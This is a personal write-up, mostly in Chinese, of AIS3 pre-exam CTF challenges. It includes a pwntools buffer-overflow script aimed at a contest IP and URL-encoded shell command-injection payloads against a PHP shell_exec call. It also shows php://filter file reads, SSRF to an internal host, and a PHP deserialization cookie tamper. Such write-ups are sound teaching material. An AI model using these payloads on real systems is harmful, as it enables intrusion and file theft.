# My First CTF Write Up

## Misc

### Piquero
* I can’t see the flag. Where is it?
* 對我來說 hint 是 I can’t see the flag. 所以我就猜是盲人點字
* 我用 Braille Translator 作為輔助
* 這一題需要注意大小寫 ... 因為沒注意錯了滿多次的 Orz ...
* 至於 flag 我很抱歉沒有紀錄 ... 所以說要慢慢 translate

### Karuego
* Students who fail to summon will be dropped out.
* 首先，我用 command strings 去看一下其中的內容
    ```
    files/UT
    files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpgUT
    P{YS
    files/Demon.pngUT
    ```
    可以發現其中藏有其他檔案
* 因此，我們需要用 binwalk 去分析他
    `binwalk -e Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png`
* 之後進入 extracted 之後的 file，我們可以看到有一個 zip 檔案被加密了，至此我們需要破解他。
* 我用這個網站拿到 hash 值 https://www.onlinehashcrack.com/tools-zip-rar-7z-archive-hash-extractor.php
    ```
    $pkzip2$2*2*1*0*8*24*d653 ... 
    ```
    因為太多我就不全放了 ...
* 之後 touch 一個 txt，用 john the ripper 破解他
    `john yourhash.txt`
    crack 之後的 password 是 `lafire`
* 之後進入 files 裡面的 demon.png 中有 flag 在圖片裡
* **Flag : AIS3{Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?}**

## Reverse

### TsaiBro
* 很好....你很腦殘嗎....敢這樣講刀劍神域.......我死也不會放過你 我..要..殺死...你..
* 這是去年的題目，差不多八成像，可以參考 http://blog.terrynini.tw/tw/2019-AIS3-前測官方解/
* 唯一不一樣的是順序，所以一樣用 command strings 來分析，得到了一個特別的字串
    `56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234`
    也就是他的順序
* 所以說我稍微改了一下去年的 code 
    ```python=
    table = ['5','6','7','8','9','{','}','_',
    'W','X','Y','0','y','z','A','B',
    'a','b','c','d','m','n','o','p',
    'S','T','U','V','G','H','I','J',
    'K','L','M','N','u','v','w','x',
    'e','f','g','h','q','r','s','t',
    'i','j','k','l','O','P','Q','R',
    'C','D','E','F','1','2','3','4']
    '56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234'
    f = open("TsaiBroSaid","r").read().split('\n')[1]
    print(f)
    f = f.split("發財")[1:]
    print(f)
    for i in range(0,len(f),2):
        print(table[(len(f[i])-1)*8+len(f[i+1])-1],end='')
    ```
* **Flag : AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}**

## PWN

### BOF
* That is easy-peasy challenge and even my grandma can do.
    nc 60.250.197.227 10000
    Challenge environment: Ubuntu 18.04
* 這一題是去年的題目 Welcome BOF
* 跟去年八成像，唯一要改的是 ip 位置還有 port
* 所以說我稍微改了一下去年的 code 
    ```python=
    from pwn import *
    ip   = '60.250.197.227'
    prot = 10001
    r = remote(ip, prot)
    #r = process("./return")

    r.recvuntil("ubuntu 18.04.")
    r.sendline(b"A" * 48 + p64(0x400687))

    r.interactive()
    ```
    
## Crypto

### Brontosaurus
* Brontosaurus peek at last year’s problems with a long neck and picked up "KcufsJ".
* 這一題是去年的題目 kcufsj
* 今年的解題方式跟去年一樣，先把 jsfuck 的內容先倒過來，之後再用 https://enkhee-osiris.github.io/Decoder-JSFuck/ decode 一下就有 flag 了
* **Flag : AIS3{Br0n7Os4uru5_ch3at_3asi1Y}**

### T-Rex
* Tyrannosaurus-rex is an nihilist.
* 這是 polybius square 的題目，我用的是 https://cryptii.com/pipes/polybius-square 來解題
* 需要注意的一點是這個網站是先取行再取列，但是題目是先取列再取行，所以說順序要改一下
    ![](https://i.imgur.com/OdbXyTt.png)
* 因為全部都是小寫，要轉成大寫
* **Flag : AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}**

## Web

### Squirrel
* Hack those creepy rats.
* https://squirrel.ais3.org/
* 這一題先 inspect 一下，可以找到 script 標籤中的內容
    ```js=
    const squirrelFile = '/etc/passwd';

    fetch('api.php?get=' + encodeURIComponent(squirrelFile))
      .then(res => res.json())
      .then(data => {
        if ('error' in data) {
          throw data.error;
        }
        data.output.split('\n')
          .map(line => line.split(':')[0].trim())
          .filter(name => name.length)
          .forEach(name => new Squirrel(name).update());
      })
      .catch(err => {
        console.log(err);
        alert('Something went wrong! Please report this to the author!');
      });
    ```
    我們可以得知有一個路徑是 `api.php?get=`
* 於是我們訪問一下 `https://squirrel.ais3.org/api.php?get=%2Fetc%2Fpasswd` 於是我們得到了 /etc/passwd 的內容
* 於是我便猜他應該是 command injection，應該是用 `shell_exec(cd)` 之類的來訪問
* 所以現在的當務之急是找到 api.php 的 source code 
* 有一次無意之中輸入了 `%00` 然後得到了資訊
    ```
    shell_exec(): NULL byte detected. Possible attack in <b>/var/www/html/api.php
    ```
    學到了一課呢 ...
* 之後訪問並且 decode json 之後得到 `api.php` 的 source code
    ```php=
    <?php

    header('Content-Type: application/json');

    if ($file = @$_GET['get']) {
        $output = shell_exec("cat '$file'");

        if ($output !== null) {
            echo json_encode([
                'output' => $output
            ]);
        } else {
            echo json_encode([
                'error' => 'cannot get file'
            ]);
        }
    } else {
        echo json_encode([
            'error' => 'empty file path'
        ]);
    }
    ```
* 之後我們把注意力集中在 `shell_exec("cat '$file'");`
* 首先我們需要執行 command ls 才能知道有哪些 file，我選擇用語句截斷的方式植入 command `/etc/passwd' && ls && cat '` 之後 url encode 一下 `%2Fetc%2Fpasswd%27%20%26%26%20ls%20%26%26%20cat%20%27` 
* 可以拿到 ls 之後的結果
    ```terminal=
    api.php
    css
    index.html
    js
    ```
* 可見沒有我們想要的，ls 的路徑應該在 `/var/www/html` 裡面，所以我們可以用 `cd ../` 來訪問 `/etc/passwd' && ls ../../../ && cat '` url encode : `%2Fetc%2Fpasswd%27%20%26%26%20ls%20..%2F..%2F..%2F%20%26%26%20cat%20%27` 得到結果
    ```terminal=
    5qu1rr3l_15_4_k1nd_0f_b16_r47.txt
    bin
    boot
    dev
    etc
    home
    lib
    lib64
    media
    mnt
    opt
    proc
    root
    run
    sbin
    srv
    sys
    tmp
    usr
    var
    ```
* 想當然，我們最想要知道的會是 `5qu1rr3l_15_4_k1nd_0f_b16_r47.txt` 之中的內容，所以 cat 一下 `/etc/passwd' &&cat ../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt && cat '` url encode : `%2Fetc%2Fpasswd%27%20%26%26cat%20..%2F..%2F..%2F5qu1rr3l_15_4_k1nd_0f_b16_r47.txt%20%26%26%20cat%20%27`
* **Flag : AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}**

### Shark
* Let's dive deep again this year.
* https://shark.ais3.org/
* 直接訪問網站，然後看到了唯一一個連結進到 `hint.txt` 中
    ```txt=
    Please find the other server in the internal network! (flag is on that server)

    GET http://some-internal-server/flag
    ```
    這個提示很像是去年的 d1v1n6 d33p3r
* 目前最想要知道的是 source code，試了一下，可以用 php 偽協議得到 source code `https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=index.php` 用 base64 decode 之後得到 source code 
    ```php=
    <?php

    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }

    ?><!DOCTYPE html>
    <head>
        <title>🦈🦈🦈</title>
        <meta charset="utf-8">
    </head>
    <body>
        <h1>🦈🦈🦈</h1>
        <a href="?path=hint.txt">Shark never cries?</a>
    </body>

    ```
* 在 linux 有很多檔案可以直接讀取，可以參考 http://wp.blkstone.me/2018/06/abusing-arbitrary-file-read/#421 ，要達到我們的目的，需要知道路由缓存，所以直接訪問 `/proc/net/fib_trie`，要注意的是不能直接訪問因為會被擋下來，要用 php 偽協議訪問 `https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=/proc/net/fib_trie` base64 decode 之後的結果
    ```=
    Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.22.0.0/16 2 0 2
        +-- 172.22.0.0/30 2 0 2
           |-- 172.22.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.22.0.3
              /32 host LOCAL
        |-- 172.22.255.255
           /32 link BROADCAST
    Local:
      +-- 0.0.0.0/0 3 0 5
         |-- 0.0.0.0
            /0 universe UNICAST
         +-- 127.0.0.0/8 2 0 2
            +-- 127.0.0.0/31 1 0 0
               |-- 127.0.0.0
    ```
    我們可以發現我們知道的內網的 ip 位置 
    ```=
    |-- 172.22.0.3
          /32 host LOCAL
    ```
    因為這是目前的內網位置，hint 中說的是另一個內網的，所以說我訪問的是 `172.22.0.2`
* `https://shark.ais3.org/?path=http://172.22.0.2/flag` 訪問之後得到 flag
* **Flag : AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}**

### Elephant
* Do elephants love cookies?
* https://elephant.ais3.org/
* **IMPORTANT**
    * There's a hint in the webpage
* 直接訪問，隨便輸入 admin 然後得到了 `Hello, admin! Your token is not sufficient to read the flag!`
* 因為題目中提到了 cookies，所以看了一下 cookies 中有什麼，發現了一個挺有意思的 cookies `elephant_user=Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MTE6IgBVc2VyAHRva2VuIjtzOjMyOiIxOGU1NTUyMTIzNjlhYzI3NGI2NTE3NWQ4NzFmMmZjZiI7fQ%3D%3D`
* `You may want to read the source code.` 這是題目給我的提示，因為沒有什麼想法，我就 fuzz 了一下，發現可以訪問 `https://elephant.ais3.org/.git/refs/heads/master` 至此可以得知是 git 洩漏的題目
* 用 Githack 這個工具拿到了 source code
    ```php=
    <?php
    
    const SESSION = 'elephant_user';
    $flag = file_get_contents('/flag');


    class User {
        public $name;
        private $token;

        function __construct($name) {
            $this->name = $name;
            $this->token = md5($_SERVER['REMOTE_ADDR'] . rand());
        }

        function canReadFlag() {
            return strcmp($flag, $this->token) == 0;
        }
    }

    if (isset($_GET['logout'])) {
        header('Location: /');
        setcookie(SESSION, NULL, 0);
        exit;
    }


    $user = NULL;

    if ($name = $_POST['name']) {
        $user = new User($name);
        header('Location: /');
        setcookie(SESSION, base64_encode(serialize($user)), time() + 600);
        exit;
    } else if ($data = @$_COOKIE[SESSION]) {
        $user = unserialize(base64_decode($data));
    }



    ?><!DOCTYPE html>
    <head>
        <title>Elephant</title>
        <meta charset='utf-8'>
        <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
        <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
        <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    </head>
    <body>
        <?php if (!$user): ?>
            <div id="login">
                <h3 class="text-center text-white pt-5">Are you familiar with PHP?</h3>
                <div class="container">
                    <div id="login-row" class="row justify-content-center align-items-center">
                        <div id="login-column" class="col-md-6">
                            <div id="login-box" class="col-md-12">
                                <form id="login-form" class="form" action="" method="post">
                                    <h3 class="text-center text-info">What's your name!?</h3>
                                    <div class="form-group">
                                        <label for="name" class="text-info">Name:</label><br>
                                        <input type="text" name="name" id="name" class="form-control">
                                    </div>
                                    <div class="form-group">
                                        <input type="submit" name="submit" class="btn btn-info btn-md" value="let me in">
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        <?php else: ?>
            <h3 class="text-center text-white pt-5">You may want to read the source code.</h3>
            <div class="container" style="text-align: center">
                <img src="images/elephant2.png">
            </div>
            <hr>
            <div class="container">
                <div class="row justify-content-center align-items-center">
                    <div class="col-md-6">
                        <div class="col-md-12">
                            <h3 class="text-center text-info">Do you know?</h3>
                            <h3 class="text-center text-info">PHP's mascot is an elephant!</h3>
                            Hello, <b><?= $user->name ?></b>!
                            <?php if ($user->canReadFlag()): ?>
                                This is your flag: <b><?= $flag ?></b>
                            <?php else: ?>
                                Your token is not sufficient to read the flag!
                            <?php endif; ?>
                            <a href="?logout">Logout!</a>
                        </div>
                    </div>
                </div>
            </div>
        <?php endif ?>
    </body>
    ```
* 可以知道 elephant_user 是用 base64 encode，所以直接把它送到 base64 decode 一下得到了 `O:4:"User":2:{s:4:"name";s:5:"admin";s:11:"Usertoken";s:32:"18e555212369ac274b65175d871f2fcf";}`
* 看起來是反序列化的題目，所以我檢查了一下，發現 `s:11:"Usertoken"` 十分奇怪，所以我把它改成 `s:9:"Usertoken"` 之後送出，然後就拿到 Flag 了
* **Flag : AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}**
